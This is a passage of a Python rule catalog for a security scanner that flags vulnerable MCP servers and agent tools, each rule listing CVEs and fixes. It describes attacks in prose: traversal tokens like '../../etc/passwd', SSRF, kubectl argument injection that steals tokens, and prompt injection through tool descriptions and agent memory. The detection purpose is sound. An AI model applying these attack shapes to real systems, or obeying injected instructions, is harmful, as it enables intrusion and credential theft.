    "chained to CWE-367 (Time-of-check Time-of-use Race Condition). Detected "
    "as an ordered approve -> mutate -> exec data flow on the same command "
    "variable; distinct from `AAK-SSRF-TOCTOU-001` (a URL allow-list "
    "DNS-rebind TOCTOU, not command spawn).",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Validate the exact argv array that will be executed, and execute that "
    "same immutable buffer — never re-parse, re-split, re-join, or append to "
    "the command after the allowlist check. If a transform is unavoidable, "
    "re-run the allowlist/deny check on the final argv immediately before "
    "spawning, pass an explicit argv list (never a shell string) with "
    "`shell=False`, and freeze the approved value (e.g. a tuple) so it cannot "
    "be mutated. Pin OpenClaw >= 2026.5.18.",
    sarif_name="ArgvAllowlistToctou",
    cve_references=["CVE-2026-53822"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-INJECT-07"],
)

_r(
    "AAK-MCP-NOAUTH-DEFAULT",
    "MCP server unauthenticated-by-default / fail-open authentication",
    "An MCP server ships an authentication check that does not actually "
    "enforce — distinct from a transport with no auth at all "
    "(`AAK-MCP-HTTP-NOAUTH-SERVER-001`). Three shapes are flagged: (a) an "
    "auth / `is_authorized` / `verify_token`-style function that returns a "
    "truthy/allow value when the secret or token is empty or unset "
    "(`if not SECRET: return True`); (b) a default / placeholder secret literal "
    "— a secret-named variable set to `\"\"` / `\"changeme\"` / `\"secret\"` / "
    "`\"admin\"` etc., or `os.environ.get(\"X_SECRET\", \"\")` with an empty "
    "default, so the server runs unauthenticated until an operator intervenes; "
    "(c) a missing-secret check that only logs a warning and continues while "
    "the server binds a non-loopback interface (`0.0.0.0` / `::`). Anchor: "
    "CVE-2026-48814 (Network-AI, CVSS 9.1) — an incomplete fix of "
    "CVE-2026-46701 whose added auth gate still admitted requests when the "
    "secret was unset. CWE-306 (Missing Authentication for Critical Function) "
    "+ CWE-862 (Missing Authorization).",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Fail closed: reject every request when the secret/token is empty, unset, "
    "or still a default — never `return True` on an empty credential and never "
    "ship a placeholder secret. Require the secret with no empty fallback "
    "(`os.environ[\"MCP_SECRET\"]`, erroring if absent), compare with a "
    "constant-time check, bind to `127.0.0.1` behind an authenticating proxy, "
    "and turn any 'no secret set' warning into a hard startup failure. Pin "
    "Network-AI past the CVE-2026-48814 fix.",
    sarif_name="McpNoAuthDefault",
    cve_references=["CVE-2026-48814", "CVE-2026-46701"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-AUTH-PATHTRAVERSAL-001",
    "MCP bearer-token joined into a session file path (path traversal)",
    "MCP server authentication code concatenates or `os.path.join`-es an "
    "untrusted token / bearer credential into a filesystem path that is then "
    "used for a session existence / read check, without rejecting path "
    "separators / `..` or resolving-and-containing the result. Because the "
    "caller controls the token, they control the path: a value like "
    "`../../etc/passwd` or `../<another-user-session>` escapes the intended "
    "session directory, turning an auth check into arbitrary-file access and "
    "cross-session takeover. Anchor: CVE-2026-52830 (CVSS 9.4, CWE-22 Path "
    "Traversal) — `fast-mcp-telegram` before 0.19.1 joined the caller-supplied "
    "bearer token straight into the session file path used to test whether a "
    "session existed, so a crafted token traversed out of the session "
    "directory; fixed in 0.19.1. The Python detector is a stdlib-`ast` taint "
    "flow (token source -> path construction -> `exists`/`open` sink, "
    "suppressed by a separator/`..` reject or a resolve-and-contain guard); "
    "TS/JS/Rust use the analogous concat-into-path regex. Distinct from "
    "`AAK-MCP-015` (a resource-handler path traversal on a request *path* "
    "parameter) — here the tainted source is the auth *token* itself.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Reject path separators and `..` in the token before it touches the "
    "filesystem; resolve the constructed session path (`os.path.realpath` / "
    "`Path.resolve()`) and verify it is inside the intended session directory "
    "(`startswith` / `Path.is_relative_to`) before use; prefer a hashed / "
    "opaque session id over the raw token as a filename. Upgrade "
    "`fast-mcp-telegram` to >= 0.19.1.",
    sarif_name="McpAuthPathTraversal",
    cve_references=["CVE-2026-52830"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-RES-01"],
)


# ---------------------------------------------------------------------------
# MCP Server Card (SEP-1649) — /.well-known/mcp/server-card.json static audit
# SEP-1649 (superseded-in-draft by SEP-2127) has servers publish a discovery
# card a client fetches and trusts BEFORE connecting; the card is a surface.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-CARD-001",
    "Poisoned tool description in an MCP server card",
    "A tool entry in a SEP-1649 server card "
    "(`/.well-known/mcp/server-card.json`) carries a `description` containing a "
    "tool-poisoning / imperative-injection payload — invisible Unicode, a "
    "prompt-injection directive, a cross-tool reference, or an encoded "
    "(base64/hex) blob. Because a client fetches and trusts the card *before* "
    "connecting, the injected instructions enter the model context ahead of any "
    "tool call. Detection reuses the AAK-POISON-001..006 detectors.",
    Severity.CRITICAL,
    Category.MCP_SERVER_CARD,
    "Treat a server card's tool descriptions as untrusted content: strip "
    "invisible Unicode, reject imperative/injection phrasing and encoded "
    "payloads, and render descriptions as data (never as instructions). Pin the "
    "card to a signed, provenance-verified publisher.",
    sarif_name="McpCardPoisonedTool",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SKILL-01"],
)

_r(
    "AAK-MCP-CARD-002",
    "MCP server card transport / advertised-capability mismatch",
    "A SEP-1649 server card's declared `transport` disagrees with its "
    "advertised capabilities: a remote transport (`http`/`sse`/`streamable-http`/"
    "`ws`, or a routable `endpoint` URL) while `authentication.required` is "
    "`false` (an anyone-can-connect network endpoint), or a `stdio`/local "
    "transport that nonetheless advertises a remote `endpoint`. A client that "
    "provisions based on the card's advertised shape connects to a transport it "
    "did not expect.",
    Severity.HIGH,
    Category.MCP_SERVER_CARD,
    "Make the card's `transport` and `authentication` consistent: require an "
    "inbound credential on every remote transport, and do not advertise a "
    "remote `endpoint` on a `stdio`/local card. Regenerate the card from the "
    "server's real runtime configuration.",
    sarif_name="McpCardTransportMismatch",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-CARD-003",
    "MCP server card missing or invalid signature / provenance",
    "A SEP-1649 server card carries no `signature` / `provenance` / "
    "`attestation` / `publisher` field, or one that is empty / a placeholder. "
    "The card's self-declared tool list, transport, and endpoint are then "
    "trusted with no proof of origin — a MITM or a typosquatting host can serve "
    "a forged card at the well-known path and the client will provision against "
    "it.",
    Severity.HIGH,
    Category.MCP_SERVER_CARD,
    "Sign the server card (detached signature or an `attestation` block) and "
    "have clients verify it against a pinned publisher key before provisioning. "
    "Populate `publisher` / `provenance` with a verifiable identity — never a "
    "placeholder.",
    sarif_name="McpCardUnsignedProvenance",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SUPPLY-08"],
)

_r(
    "AAK-MCP-CARD-004",
    "Over-broad capability claims in an MCP server card",
    "A SEP-1649 server card asserts over-broad capabilities: a wildcard auth "
    "scope (`*` / `all`), a `capabilities` object with everything enabled and "
    "no constraint, or `authentication.required: true` paired with an empty "
    "`schemes` list (no enforceable method). Over-broad claims invite clients "
    "to grant more trust / scope than the server needs, widening blast radius "
    "on compromise.",
    Severity.MEDIUM,
    Category.MCP_SERVER_CARD,
    "Declare only the capabilities and scopes the server actually exposes; "
    "replace wildcard scopes with an explicit list, and pair "
    "`authentication.required: true` with at least one concrete scheme. "
    "Least-privilege the card.",
    sarif_name="McpCardOverBroadClaims",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-KONG-CVE-2026-13341-001",
    "Kong Konnect MCP server < 1.0.0 (indirect prompt injection)",
    "The Kong Konnect MCP server before 1.0.0 is vulnerable to indirect prompt "
    "injection: untrusted content returned to the server (e.g. an API response, "
    "spec, or resource body it relays to the agent) can carry attacker-authored "
    "instructions that the agent then acts on, causing it to issue unintended "
    "Kong Admin/Konnect API requests it was never asked to make — a "
    "confidentiality-impacting cross-boundary injection, not a generic "
    "prompt-injection heuristic (CVE-2026-13341, CVSS 7.4 HIGH, published "
    "2026-07-03). A config that dispatches the Konnect MCP server at a version "
    "below 1.0.0 (or unpinned) is exposed.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Upgrade the Kong Konnect MCP server to >= 1.0.0 and pin it explicitly. "
    "Treat every API/spec/resource body the server relays as untrusted data "
    "(never as instructions), and constrain the agent's Konnect/Admin API "
    "credentials to the least scope the workflow needs so an injected request "
    "cannot reach sensitive endpoints.",
    sarif_name="KongKonnectMcpPromptInjection",
    cve_references=["CVE-2026-13341"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI01"],
    adversa_references=["ADV-INJECT-01"],
)

_r(
    "AAK-MCP-GATEWAY-REGISTRY-CVE-2026-14471-001",
    "Amazon mcp-gateway-registry < 1.0.13 (SQL injection)",
    "The Amazon `mcp-gateway-registry` before 1.0.13 improperly neutralizes a "
    "caller-supplied `table_name` in the metrics-service retention-policy "
    "component: the value is interpolated directly into an SQL statement in "
    "identifier position, so an authenticated remote user can execute arbitrary "
    "SQL against the gateway's metrics store (CVE-2026-14471, HIGH CVSS 8.1, "
    "CWE-89, published 2026-07-06). A project that depends on the gateway "
    "registry at a version below 1.0.13 (or unpinned) is exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-gateway-registry` to >= 1.0.13 and pin it explicitly. Never "
    "interpolate a request-supplied value into an SQL identifier position; "
    "validate `table_name` against a fixed allow-list of known table names, or "
    "quote it with the driver's identifier-quoting API rather than string "
    "formatting.",
    sarif_name="McpGatewayRegistrySqlInjection",
    cve_references=["CVE-2026-14471"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SUPPLY-01"],
)


# ---------------------------------------------------------------------------
# MCP tool-argument URL SSRF (CVE-2026-14748).
#
# The generic AAK-SSRF-001..005 family keys on request-object accessors
# (`args[...]` / `req.query` / `request.json`) and misses the canonical
# CVE-2026-14748 shape, where a bare tool-handler PARAMETER named `url` flows
# straight into `requests.get(url)`. This CVE-pinned rule closes that gap with
# an AST parameter->fetch taint path, mirroring how AAK-LANGCHAIN-SSRF-REDIR-001
# and AAK-LMDEPLOY-VL-SSRF-001 sit alongside the generic SSRF class.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-SSRF-001",
    "MCP tool handler fetches a caller-supplied URL without host/scheme allow-list",
    "An MCP tool handler passes an attacker-controllable URL argument "
    "(`url` / `endpoint` / `target` / `uri` and similar) straight into an "
    "outbound fetch (`requests` / `httpx` / `urllib` / `aiohttp`) without "
    "validating the host or scheme first, so a caller-supplied URL is fetched "
    "server-side and can reach loopback, private-range, or cloud-metadata "
    "endpoints (CWE-918, server-side request forgery). NVD, CVE-2026-14748: "
    "\"A flaw has been found in AIAnytime Awesome-MCP-Server ... the file "
    "mcp-wiki/src/mcp_wiki/server.py of the component mcp-wiki/wiki-summary. "
    "This manipulation of the argument url causes server-side request forgery. "
    "The attack may be initiated remotely. The exploit has been published.\" "
    "(CVSS 6.3 MEDIUM, https://nvd.nist.gov/vuln/detail/CVE-2026-14748).",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Deny by default: before fetching, parse the URL, require an https scheme, "
    "resolve the host, and reject anything not on an explicit host allow-list "
    "(also reject RFC 1918, 127.0.0.0/8, 169.254.0.0/16, ::1, fc00::/7). "
    "Disable automatic redirects or re-validate every hop, and pin the resolved "
    "IP for the actual request to defeat DNS rebinding.",
    sarif_name="McpToolArgUrlSsrf",
    cve_references=["CVE-2026-14748"],
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SSRF-01"],
)


# ---------------------------------------------------------------------------
# Serena MCP toolkit unauthenticated-dashboard → RCE (CVE-2026-49471).
# Delivered as a dependency version-pin (fixed in serena-agent 1.5.2), mirroring
# the gateway-registry / Kong CVE pins, but the underlying weakness is CWE-306
# missing authentication (+ CWE-352 CSRF / DNS-rebinding) — same MCP_CONFIG
# no-auth class as AAK-AZURE-MCP-NOAUTH-001.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-SERENA-CVE-2026-49471-001",
    "Serena MCP toolkit < 1.5.2 (unauthenticated dashboard → DNS-rebinding RCE)",
    "The Serena MCP coding toolkit (`serena-agent`) before 1.5.2 ships a "
    "built-in web dashboard that \"exposes an unauthenticated Flask API on a "
    "fixed, predictable port, with no authentication, no CSRF protection, and "
    "no Host header validation. A DNS rebinding attack allows a malicious "
    "webpage to reach this API from any browser and write arbitrary content to "
    "the agent's persistent memory store, which the agent reads and acts on "
    "autonomously. Combined with execute_shell_command using shell=True, this "
    "creates a remote code execution chain requiring only that the victim visit "
    "a malicious webpage while Serena is running.\" (NVD, CVE-2026-49471, HIGH "
    "CVSS 8.3, CWE-306 + CWE-352, published 2026-07-07). A project depending on "
    "`serena-agent` below 1.5.2 (or unpinned, or launched from an unpinned "
    "`oraios/serena` / `serena-mcp-server` reference) is exposed. Fixed in 1.5.2.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Upgrade `serena-agent` to >= 1.5.2 and pin it explicitly. 1.5.2 binds the "
    "dashboard to loopback, adds a random per-session token, validates the Host "
    "header, and enforces CSRF — which together break the DNS-rebinding path. "
    "Do not expose the Serena dashboard on a routable interface, and keep "
    "`execute_shell_command` behind an explicit approval gate.",
    sarif_name="SerenaMcpUnauthDashboardRce",
    cve_references=["CVE-2026-49471"],
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AUTH-01"],
)


# ---------------------------------------------------------------------------
# 2026-07 MCP/agent CVE disclosure wave — dependency version-pins.
#
# Eight vulnerable-dependency pins for MCP/agent CVEs disclosed 2026-07-08..12
# that ship a vendor fix and a pinnable PyPI / npm artifact. Detector:
# `mcp_cve_pins_2026_07`. Package names + fix floors verified against PyPI / npm
# before shipping. (Three sibling CVEs without a pinnable artifact or a tractable
# version scheme — aerostack-mcp SSRF, MaxKB stdio command-injection, langchain4j
# Maven — are dispositioned in CHANGELOG.cves.md rather than as pins.)
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-LITELLM-CVE-2026-59822-001",
    "LiteLLM < 1.84.0 (MCP auth bypass + skills-archive path traversal)",
    "LiteLLM before 1.84.0 has two MCP-relevant flaws: its MCP Streamable-HTTP "
    "endpoint let a fabricated Authorization header trigger an OAuth2 passthrough "
    "fallback that replaced failed key validation with an empty `UserAPIKeyAuth()`, "
    "reaching MCP tooling without a valid key (CVE-2026-59822); and its Skills "
    "archive extraction did not validate ZIP entry paths, allowing path traversal "
    "outside the staging directory (CVE-2026-59820, fixed 1.83.7-stable). Both are "
    "fixed by 1.84.0. A project pinning `litellm` below 1.84.0 (or unpinned) is "
    "exposed. (CVSS not yet scored by NVD; auth bypass to MCP tooling.)",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `litellm` to >= 1.84.0 and pin it. Ensure MCP routes require a valid "
    "LiteLLM key (no empty-auth fallback) and that skill/archive extraction "
    "validates entry paths against the destination directory.",
    sarif_name="LiteLLMMcpAuthBypass",
    cve_references=["CVE-2026-59822", "CVE-2026-59820"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-CLINE-CVE-2026-59723-001",
    "Cline < 3.0.30 (Hub dashboard WebSocket origin bypass → RCE)",
    "The Cline (`cline`) Hub dashboard server before 3.0.30 accepts WebSocket "
    "connections on `/browser` without validating the Origin header, and when "
    "`ROOM_SECRET` is unset on a local 127.0.0.1 bind, `isAuthorizedBrowserRequest()` "
    "lets an attacker-controlled website send `desktopCommand` frames that read "
    "workspace state, mutate MCP and provider settings, and trigger command "
    "execution once a provider/model is configured (CVE-2026-59723, CVSS 8.8). "
    "Fixed in 3.0.30.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `cline` to >= 3.0.30 and pin it. Do not run the Hub dashboard on an "
    "untrusted network; set `ROOM_SECRET` and require Origin validation on the "
    "dashboard WebSocket.",
    sarif_name="ClineHubDashboardOriginBypass",
    cve_references=["CVE-2026-59723"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-TEXTEDITOR-CVE-2026-15138-001",
    "tumf mcp-text-editor path traversal (affected up to 1.0.2)",
    "The `mcp-text-editor` MCP server's `_validate_file_path` "
    "(`mcp_text_editor/text_editor.py`) mishandles a caller-supplied `file_path`, "
    "allowing remote path traversal (CVE-2026-15138, CVSS 6.3). NVD lists versions "
    "up to 1.0.2 as affected; the vendor closed the report without an explanation, "
    "so treat <= 1.0.2 (and unpinned) as exposed and move to the latest release.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-text-editor` past 1.0.2 to the latest release and pin it; verify "
    "the traversal fix landed. Constrain the editor to an allow-listed root and "
    "reject `..` / absolute paths in `file_path`.",
    sarif_name="McpTextEditorPathTraversal",
    cve_references=["CVE-2026-15138"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI09"],
    adversa_references=["ADV-SUPPLY-01"],
)

_r(
    "AAK-MCP-N8N-CVE-2026-59207-001",
    "n8n < 2.27.4 / 2.28.1 (MCP tool bypasses credential domain allow-list → SSRF/exfil)",
    "n8n before 2.27.4 (and the 2.28.x line before 2.28.1) did not enforce the "
    "\"Allowed HTTP Request Domains\" restriction on credentials when an AI-Agent "
    "MCP tool was pointed at an arbitrary URL, letting a member-level user with "
    "use-only access to a shared credential send its secret to an external server "
    "they control (CVE-2026-59207, CVSS 6.5). A project pinning `n8n` below 2.27.4 "
    "(or unpinned) is exposed; a 2.28.0 pin is also affected — move to 2.28.1.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `n8n` to >= 2.27.4 (or >= 2.28.1 on the 2.28 line) and pin it. Enforce "
    "the credential domain allow-list on MCP/HTTP tool destinations so a "
    "member-level user cannot redirect a shared credential to an external host.",
    sarif_name="N8nMcpCredentialDomainBypass",
    cve_references=["CVE-2026-59207"],
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SSRF-01"],
)

_r(
    "AAK-MCP-RUFLO-CVE-2026-59726-001",
    "ruflo < 3.16.3 (unauthenticated MCP bridge → tools/call RCE)",
    "The `ruflo` agent meta-harness before 3.16.3 shipped a default "
    "docker-compose deployment that exposed the MCP bridge `POST /mcp` and "
    "`POST /mcp/:group` endpoints with no authentication, letting an unauthenticated "
    "network attacker invoke `tools/call` for `terminal_execute`, obtain a shell in "
    "the bridge container, read provider API keys, and poison AgentDB learning-store "
    "patterns (CVE-2026-59726, CVSS 10 CRITICAL). Fixed in 3.16.3.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `ruflo` to >= 3.16.3 and pin it. Never expose the MCP bridge without "
    "authentication; bind it to loopback and require a token on `/mcp` routes.",
    sarif_name="RufloUnauthMcpBridgeRce",
    cve_references=["CVE-2026-59726"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-DEEPSEEK-CVE-2026-55604-001",
    "@arikusi/deepseek-mcp-server < 1.8.0 (unbound session IDs + unauth HTTP transport)",
    "`@arikusi/deepseek-mcp-server` from 1.4.2 up to (not including) 1.8.0 accepts "
    "caller-supplied `session_id` values in its process-global `SessionStore` "
    "without binding them to an authenticated principal, so an attacker can "
    "enumerate active sessions via `deepseek_sessions` and resume a victim's "
    "conversation via `deepseek_chat` (CVE-2026-55604, CVSS 8.6); its self-hosted "
    "HTTP transport also exposes `POST /mcp` with no `authProvider`, letting an "
    "unauthenticated client initialize a session and invoke tools that use the "
    "server-side `DEEPSEEK_API_KEY` (CVE-2026-55605, CVSS 5.3). Both fixed by 1.8.0.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `@arikusi/deepseek-mcp-server` to >= 1.8.0 and pin it. Bind session "
    "IDs to an authenticated principal / transport session, and configure an "
    "`authProvider` so `POST /mcp` is not reachable unauthenticated.",
    sarif_name="DeepseekMcpUnboundSession",
    cve_references=["CVE-2026-55604", "CVE-2026-55605"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-K8S-CVE-2026-61459-001",
    "mcp-server-kubernetes < 3.9.0 (argument injection → kubectl --server redirect)",
    "`mcp-server-kubernetes` before 3.9.0 has an argument-injection flaw in its "
    "structured tools (`kubectl_get`, `kubectl_describe`, `kubectl_delete`): "
    "`resourceType` / `name` parameters with leading dashes bypass the "
    "`assertNoDangerousFlags` check, so an attacker can inject `--server` to "
    "redirect kubectl at an attacker-controlled API server, exfiltrating the "
    "operator's bearer token and enabling full cluster compromise (CVE-2026-61459, "
    "CVSS 9.8 CRITICAL). Fixed in 3.9.0.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-server-kubernetes` to >= 3.9.0 and pin it. Reject tool arguments "
    "beginning with `-` and pass a `--` end-of-options separator before "
    "caller-supplied values to any spawned `kubectl` command.",
    sarif_name="McpServerKubernetesArgInjection",
    cve_references=["CVE-2026-61459"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI01"],
    adversa_references=["ADV-INJECT-01"],
)

_r(
    "AAK-MCP-ASTRBOT-CVE-2026-15501-001",
    "AstrBot MCP-test endpoint SSRF (affected up to 4.25.2)",
    "AstrBot's `ToolsRoute.test_mcp_connection` "
    "(`astrbot/dashboard/routes/tools.py`, MCP Test Endpoint) fetches a "
    "caller-supplied `mcp_server_config.url`, allowing remote server-side request "
    "forgery (CVE-2026-15501, CVSS 6.3). NVD lists versions up to 4.25.2 as "
    "affected and the vendor did not respond, so treat <= 4.25.2 (and unpinned) as "
    "exposed and move to the latest release.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `astrbot` past 4.25.2 to the latest release and pin it. Validate the "
    "MCP-test URL against an allow-list (scheme + host) and block private / "
    "loopback / metadata ranges before fetching.",
    sarif_name="AstrBotMcpTestSsrf",
    cve_references=["CVE-2026-15501"],
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SSRF-01"],
)

# --- 2026-07-13..15 MCP/agent CVE disclosure wave (pinnable artifacts) -------
# Package names + fix floors verified against PyPI / npm and, where available,
# NVD CPE version ranges before shipping. Non-pinnable siblings (mastergo-magic-mcp
# with no vendor fix, Grafana MCP on Go, mcp-gitlab with no NVD version data yet)
# are dispositioned in CHANGELOG.cves.md.

_r(
    "AAK-MCP-HEALTHLAKE-CVE-2026-15643-001",
    "AWS HealthLake MCP server pagination SSRF → credential exfil (< 0.0.14)",
    "`awslabs.healthlake-mcp-server` before 0.0.14 does not validate that "
    "pagination URLs derived from the `next_token` parameter point back to the "
    "expected HealthLake endpoint, so a remote authenticated caller can redirect "
    "subsequent requests to an attacker-controlled server and exfiltrate the AWS "
    "temporary security credentials the server attaches (CVE-2026-15643, CVSS 7.3, "
    "SSRF / CWE-918). Treat < 0.0.14 (and unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `awslabs.healthlake-mcp-server` to >= 0.0.14 and pin it. Validate that "
    "pagination / `next_token` URLs resolve to the configured HealthLake endpoint "
    "before following them.",
    sarif_name="HealthLakeMcpPaginationSsrf",
    cve_references=["CVE-2026-15643"],
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SSRF-01"],
)

_r(
    "AAK-MCP-PRAISONAI-CVE-2026-61427-001",
    "PraisonAI MCP HTTP-stream unauthenticated by default (< 4.6.78)",
    "PraisonAI before 4.6.78 exposes the MCP HTTP-stream transport without "
    "authentication by default: `praisonai mcp serve --transport http-stream` "
    "defaults `--api-key` to None and only enforces Authorization/Bearer checks "
    "when a key is configured, so an unauthenticated client can initialize a "
    "session, enumerate tools (`tools/list`), and invoke them (`tools/call`); "
    "arguments are also forwarded without validating the advertised inputSchema "
    "(CVE-2026-61427, CVSS 7.3). Default bind is 127.0.0.1, so remote reach needs "
    "a network bind. Treat < 4.6.78 (and unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `praisonai` to >= 4.6.78 and pin it. Always configure `--api-key` for "
    "the HTTP-stream transport and never bind it to a non-loopback interface "
    "without authentication.",
    sarif_name="PraisonAiMcpNoAuthDefault",
    cve_references=["CVE-2026-61427"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-APPIUM-CVE-2026-58500-001",
    "MCP Appium locator-UI HTML/JS injection → unauthorized tool exec (< 1.85.10)",
    "`appium-mcp` (MCP Appium) before 1.85.10 interpolates attacker-controlled "
    "element attributes (text, content-desc, resource-id, locator selectors) into "
    "an HTML template literal in `createLocatorGeneratorUI` with no HTML/JS "
    "escaping. An attacker who controls the app-under-test UI can inject script "
    "into the MCP UI resource returned by `generate_locators`; when the victim's "
    "MCP client renders it, the script invokes arbitrary MCP tools via "
    "`window.parent.postMessage` (CVE-2026-58500, CVSS 8.2). Treat < 1.85.10 (and "
    "unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `appium-mcp` to >= 1.85.10 and pin it. Context-escape all element "
    "attributes before interpolating them into UI-resource HTML.",
    sarif_name="AppiumMcpLocatorUiInjection",
    cve_references=["CVE-2026-58500"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-INJECT-01"],
)

_r(
    "AAK-MCP-PENPOT-CVE-2026-45805-001",
    "Penpot MCP ReplServer unauthenticated /execute RCE (< 2.15.0)",
    "`@penpot/mcp` before 2.15.0 binds its ReplServer to `0.0.0.0:4403` and "
    "exposes an unauthenticated `/execute` endpoint that passes the `code` field "
    "to `PluginBridge.executePluginTask()`, letting anyone on the network execute "
    "arbitrary JavaScript on the server (CVE-2026-45805, CVSS 8.8). Treat < 2.15.0 "
    "(and unpinned) as exposed.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `@penpot/mcp` to >= 2.15.0 and pin it. Never expose a REPL / eval "
    "endpoint unauthenticated; bind debugging servers to loopback only.",
    sarif_name="PenpotMcpReplRce",
    cve_references=["CVE-2026-45805"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-OPENCLAW-CVE-2026-62195-001",
    "OpenClaw MCP loopback authorization bypass (2026.5.20–2026.6.5)",
    "OpenClaw 2026.5.20 up to (but not including) 2026.6.6 contains an "
    "authorization-bypass in the MCP loopback feature that lets lower-trust "
    "callers execute owner-only tools by routing through configured input paths, "
    "so an attacker can execute or persist actions beyond their intended "
    "permissions (CVE-2026-62195, CVSS 8.3; NVD range `2026.5.20` <= v < "
    "`2026.6.6`). The same pin also covers CVE-2026-62208 (Authorization headers "
    "forwarded during MCP SSE redirects, fixed in 2026.6.5). Treat that range "
    "(and unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `openclaw` to >= 2026.6.6 and pin it. Enforce the caller's trust tier "
    "on every MCP loopback tool invocation, not just at the transport edge.",
    sarif_name="OpenClawMcpLoopbackAuthzBypass",
    cve_references=["CVE-2026-62195", "CVE-2026-62208"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-REPOMIX-CVE-2026-49988-001",
    "Repomix MCP server bypasses secret-scan file-read boundary (< 1.14.1)",
    "Repomix before 1.14.1 lets the MCP server's `attach_packed_output` / "
    "`read_repomix_output` flow register and read arbitrary local `.json` / `.txt` "
    "/ `.md` / `.xml` files without the `file_system_read_file` `runSecretLint()` "
    "safety check or packed-output validation, so MCP callers bypass the local "
    "file-read secret-scanning boundary and can read secrets Repomix would "
    "otherwise redact (CVE-2026-49988). Treat < 1.14.1 (and unpinned) as exposed.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `repomix` to >= 1.14.1 and pin it. Ensure every MCP file-read path "
    "runs the same secret-lint / output-validation checks as the direct read tool.",
    sarif_name="RepomixMcpSecretLintBypass",
    cve_references=["CVE-2026-49988"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-DATA-01"],
)

_r(
    "AAK-MCP-BETTERAUTH-CVE-2026-53512-001",
    "Better Auth OAuth/MCP token-endpoint auth bypass + code replay (< 1.6.11)",
    "Better Auth before 1.6.11 ships two token-endpoint flaws reachable through "
    "the `mcp` and legacy `oidcProvider` plugins (and `@better-auth/oauth-provider` "
    "from 1.6.0): the `refresh_token` grant authenticates only possession of the "
    "refreshToken row + matching `client_id` and never verifies the confidential "
    "client's `client_secret`, letting an attacker with a refresh token mint "
    "access/refresh tokens (CVE-2026-53512); and the `authorization_code` grant "
